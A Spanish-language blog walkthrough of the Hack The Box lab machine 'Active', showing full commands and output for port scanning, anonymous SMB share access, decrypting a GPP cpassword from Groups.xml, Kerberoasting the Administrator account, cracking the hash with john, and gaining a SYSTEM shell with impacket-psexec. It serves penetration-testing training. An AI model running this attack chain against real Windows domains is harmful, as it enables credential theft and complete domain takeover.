---
title: Hack The Box Active
author: k4miyo
date: 2021-12-05
math: true
mermaid: true
image:
  path: /assets/images/htb/hackthebox.png
categories: [Easy, Windows]
tags: [Windows, Kerberoasting, Active Directory, Powershell]
ping: true
---

## Active
Se procede con la fase de reconocimiento lanzando primeramente un `ping` a la dirección IP 10.10.10.100.

```bash
❯ ping -c 1 10.10.10.100
PING 10.10.10.100 (10.10.10.100) 56(84) bytes of data.
64 bytes from 10.10.10.100: icmp_seq=1 ttl=127 time=136 ms

--- 10.10.10.100 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 136.281/136.281/136.281/0.000 ms
```

De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Windows. A continuación se procede con la ejecución de `nmap` para determinar los puertos abiertos de la máquina y exportanto la información al archivo **allPorts**.

```bash
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.100 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-28 22:17 CST
Initiating SYN Stealth Scan at 22:17         
Scanning 10.10.10.100 [65535 ports]        
Discovered open port 445/tcp on 10.10.10.100  
Discovered open port 139/tcp on 10.10.10.100  
Discovered open port 135/tcp on 10.10.10.100  
Discovered open port 53/tcp on 10.10.10.100 
Discovered open port 5722/tcp on 10.10.10.100
Discovered open port 464/tcp on 10.10.10.100  
Discovered open port 49155/tcp on 10.10.10.100
Discovered open port 49182/tcp on 10.10.10.100
Discovered open port 49158/tcp on 10.10.10.100                                                                                   
Discovered open port 49169/tcp on 10.10.10.100
Discovered open port 636/tcp on 10.10.10.100  
Discovered open port 49157/tcp on 10.10.10.100
Discovered open port 9389/tcp on 10.10.10.100                                                                                    
Discovered open port 88/tcp on 10.10.10.100                                                                                      
Discovered open port 49152/tcp on 10.10.10.100
Discovered open port 49154/tcp on 10.10.10.100  
Discovered open port 49153/tcp on 10.10.10.100  
Discovered open port 389/tcp on 10.10.10.100    
Discovered open port 3269/tcp on 10.10.10.100   
Discovered open port 49171/tcp on 10.10.10.100  
Discovered open port 3268/tcp on 10.10.10.100   
Discovered open port 593/tcp on 10.10.10.100    
Completed SYN Stealth Scan at 22:18, 14.26s elapsed (65535 total ports)
Nmap scan report for 10.10.10.100               
Host is up, received user-set (0.14s latency).  
Scanned at 2021-11-28 22:17:47 CST for 15s      
Not shown: 65477 closed tcp ports (reset), 36 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5722/tcp  open  msdfsr           syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
49152/tcp open  unknown          syn-ack ttl 127
49153/tcp open  unknown          syn-ack ttl 127
49154/tcp open  unknown          syn-ack ttl 127
49155/tcp open  unknown          syn-ack ttl 127
49157/tcp open  unknown          syn-ack ttl 127
49158/tcp open  unknown          syn-ack ttl 127
49169/tcp open  unknown          syn-ack ttl 127
49171/tcp open  unknown          syn-ack ttl 127
49182/tcp open  unknown          syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 14.36 seconds
           Raw packets sent: 69987 (3.079MB) | Rcvd: 68046 (2.722MB)
```

Mediante la función [extractPorts](/posts/extractPorts) definida a nivel de `zsh` , se obtiene la información más relevante de la captura grepeable.

```bash
❯ extractPorts allPorts
───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: extractPorts.tmp
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ 
   2   │ [*] Extracting information...
   3   │ 
   4   │     [*] IP Address: 10.10.10.100
   5   │     [*] Open ports: 53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,49152,49153,49154,49155,49157,49158,49169,4917
       │ 1,49182
   6   │ 
   7   │ [*] Ports copied to clipboard
```

A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.

```bash
❯ nmap -sC -sV -p53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,49152,49153,49154,49155,49157,49158,49169,49171,49182 10.10.10.100 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-28 22:22 CST
Nmap scan report for 10.10.10.100
Host is up (0.14s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  tcpwrapped
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc         Microsoft Windows RPC
9389/tcp  open  mc-nmf        .NET Message Framing
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49169/tcp open  msrpc         Microsoft Windows RPC
49171/tcp open  msrpc         Microsoft Windows RPC
49182/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 4m57s
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2021-11-29T04:28:39
|_  start_date: 2021-11-29T04:26:46

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 74.86 seconds
```

Tenemos abierto el puerto 445, por lo que podríamos tratar de ver recursos con una *Null session*:

```bash
❯ smbclient -L 10.10.10.100 -N
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Replication     Disk      
        SYSVOL          Disk      Logon server share 
        Users           Disk      
SMB1 disabled -- no workgroup available
❯ smbmap -H 10.10.10.100
[+] IP: 10.10.10.100:445        Name: 10.10.10.100                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        Replication                                             READ ONLY
        SYSVOL                                                  NO ACCESS       Logon server share 
        Users                                                   NO ACCESS

```

Observamos que tenemos permisos de lectura bajo el recurso `Replication`, así que vamos a echarle un ojo. Como vemos que cuenta con múltiples directorios internos uno dentro de otro, mejor vamos descargarlos a nuestro equipo de atacante (**Nota**: En este caso se descargan debido a que son relativamente pocos, en caso de que sean muchos, es recomendable crear una mountura).

```bash
❯ smbclient //10.10.10.100/Replication -N
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> 
smb: \> dir
  .                                   D        0  Sat Jul 21 05:37:44 2018
  ..                                  D        0  Sat Jul 21 05:37:44 2018
  active.htb                          D        0  Sat Jul 21 05:37:44 2018

                10459647 blocks of size 4096. 5728098 blocks available
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\GPT.INI of size 23 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
getting file \active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\GPT.INI of size 22 as active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Group Policy\GPE.INI of size 119 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/Group Policy/GPE.INI (0.2 KiloBytes/sec) (average 0.1 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Registry.pol of size 2788 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol (5.0 KiloBytes/sec) (average 1.3 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml of size 533 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml (1.0 KiloBytes/sec) (average 1.3 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 1098 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (2.0 KiloBytes/sec) (average 1.4 KiloBytes/sec)
getting file \active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 3722 as active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (6.7 KiloBytes/sec) (average 2.1 KiloBytes/sec)
smb: \>
```

Una vez que nos hayamos descargado los recursos a nuestra máquina de atacante, vamos a echarles un ojo:

```bash
❯ tree
.
└── active.htb
    ├── DfsrPrivate
    │   ├── ConflictAndDeleted
    │   ├── Deleted
    │   └── Installing
    ├── Policies
    │   ├── {31B2F340-016D-11D2-945F-00C04FB984F9}
    │   │   ├── GPT.INI
    │   │   ├── Group Policy
    │   │   │   └── GPE.INI
    │   │   ├── MACHINE
    │   │   │   ├── Microsoft
    │   │   │   │   └── Windows NT
    │   │   │   │       └── SecEdit
    │   │   │   │           └── GptTmpl.inf
    │   │   │   ├── Preferences
    │   │   │   │   └── Groups
    │   │   │   │       └── Groups.xml
    │   │   │   └── Registry.pol
    │   │   └── USER
    │   └── {6AC1786C-016F-11D2-945F-00C04fB984F9}
    │       ├── GPT.INI
    │       ├── MACHINE
    │       │   └── Microsoft
    │       │       └── Windows NT
    │       │           └── SecEdit
    │       │               └── GptTmpl.inf
    │       └── USER
    └── scripts

22 directories, 7 files
```

Dentro de lo observamos, tenemos un recurso interesante en el cual podríamos encontrar credenciales `Groups.xml` asociado al SYSVOL. SYSVOL es el recurso compartido de todo el dominio en Active Directory al que todos los usuarios autenticados tienen acceso de lectura. SYSVOL contiene scripts de inicio de sesión, datos de políticas de grupo y otros datos de todo el dominio que deben estar disponibles en cualquier lugar donde haya un controlador de dominio (ya que SYSVOL se sincroniza y comparte automáticamente entre todos los controladores de dominio). Para mayor información, podríamos consultar el siguiente recurso: [adsecurity](https://adsecurity.org/?p=2288).

Vamos a tratar de visualizar el contenido de dicho archivo:

```bash
❯ cat active.htb/Policies/\{31B2F340-016D-11D2-945F-00C04FB984F9\}/MACHINE/Preferences/Groups/Groups.xml
───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ <?xml version="1.0" encoding="utf-8"?>
   2   │ <Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active
       │ .htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U
       │ " newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8
       │ pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
   3   │ </Groups>
───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

Vamos a filtrar por la información que nos interesa, que es el campo `cpassword` y `userName`:

```bash
❯ cat active.htb/Policies/\{31B2F340-016D-11D2-945F-00C04FB984F9\}/MACHINE/Preferences/Groups/Groups.xml | grep -o 'cpassword="[^"]\+"\|userName="[^"]\+"'
cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
userName="active.htb\SVC_TGS"
```

Con la utilidad `gpp-decrypt` podemos obtener la contraseña en texto claro, en este caso para el usuario `active.htb\SVC_TGS`.

```bash
❯ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
GPPstillStandingStrong2k18
```

Como siempre, guardamos las credenciales que identifiquemos y vamos a validarlas:

```bash
❯ crackmapexec smb 10.10.10.100 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18'
SMB         10.10.10.100    445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    DC               [+] 
active.htb\SVC_TGS:GPPstillStandingStrong2k18
❯ smbmap -H 10.10.10.100 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18'
[+] IP: 10.10.10.100:445        Name: 10.10.10.100                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        Replication                                             READ ONLY
        SYSVOL                                                  READ ONLY       Logon server share 
        Users                                                   READ ONLY

```

Vemos que las credenciales son válidas y ahora tenemos permisos de lectura sobre varios recursos que antes no podíamos del servicio SMB. Ahora podríamos tratar de conectarnos a través de `rpcclient` para obtener información sobre el dominio:

```bash
❯ rpcclient -U "SVC_TGS" 10.10.10.100
Enter WORKGROUP\SVC_TGS's password: 
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[SVC_TGS] rid:[0x44f]
rpcclient $> enumdomgroups
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[DnsUpdateProxy] rid:[0x44e]
rpcclient $> querygroupmem 0x200
        rid:[0x1f4] attr:[0x7]
```

Vemos que el único usuario dentro del grupos `Admins` es `Administrator`. Ahora, con la utilidad `impacket-GetUserSPNs` podemos solicitar un TGS, en este caso del usuario **Administrator**. (**Nota**: En caso de obtener el error `Kerberos SessionError`, nos instalamos `rdate` para sincronizar nuestro relog con el Domain Controller `rdate -n 10.10.10.100`)
.
```bash
❯ impacket-GetUserSPNs -dc-ip 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStrong2k18 -request -output tgs.hash
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 14:06:40.351723  2021-01-21 10:07:03.723783
```

Como ya tenemos un hash dentro del archivo `tgs.hash`, ya debemos estar pensando en `john`:

```bash
❯ john --wordlist=/usr/share/wordlists/rockyou.txt tgs.hash
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Ticketmaster1968 (?)
1g 0:00:00:47 DONE (2021-12-05 22:30) 0.02121g/s 223568p/s 223568c/s 223568C/s Tiffani1432..Thehunter22
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Ya tenemos la contraseña del usuario **Administrator** del dominio y podemos conectarnos a la máquina:

```bash
❯ impacket-psexec active.htb/Administrator:Ticketmaster1968@10.10.10.100
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 10.10.10.100.....
[*] Found writable share ADMIN$
[*] Uploading file vzDHsSZG.exe
[*] Opening SVCManager on 10.10.10.100.....
[*] Creating service DVAK on 10.10.10.100.....
[*] Starting service DVAK.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>
```

Nos encontramos dentro de la máquina como el usuario `nt authority\system` y podemos visualizar las flags (user.txt y root.txt).
